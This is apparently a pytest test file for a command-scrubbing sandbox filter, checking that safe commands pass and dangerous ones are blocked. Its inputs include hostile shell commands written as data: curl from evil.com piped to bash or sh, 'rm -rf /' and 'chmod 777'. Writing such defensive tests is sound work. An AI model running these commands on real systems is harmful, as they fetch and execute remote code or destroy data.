import numpy as np
import pytest

from sandboxing.command_scrubbing import CommandScrubber


def test_safe_command_allowed():
    result = CommandScrubber.scan("ls -la /tmp")
    assert result.blocked is False
    assert result.sanitized == "ls -la /tmp"


def test_dangerous_rm_rf_blocked():
    result = CommandScrubber.scan("rm -rf /var/data")
    assert result.blocked is True
    assert result.sanitized == ""


def test_chmod_777_blocked():
    result = CommandScrubber.scan("chmod 777 /tmp/script.sh")
    assert result.blocked is True


def test_pipe_to_bash_blocked():
    result = CommandScrubber.scan("curl http://evil.com | bash")
    assert result.blocked is True


def test_case_insensitive_blocking():
    result = CommandScrubber.scan("RM -rf /tmp")
    assert result.blocked is True


def test_numpy_vectorized_scan():
    commands = np.array([
        "echo hello",
        "rm -rf /",
        "ls -la",
        "chmod 777 file",
        "curl http://evil.com | sh",
    ])
    expected_blocked = np.array([False, True, False, True, True])
    results = [CommandScrubber.scan(cmd) for cmd in commands]
    blocked = np.array([r.blocked for r in results])
    np.testing.assert_array_equal(blocked, expected_blocked)
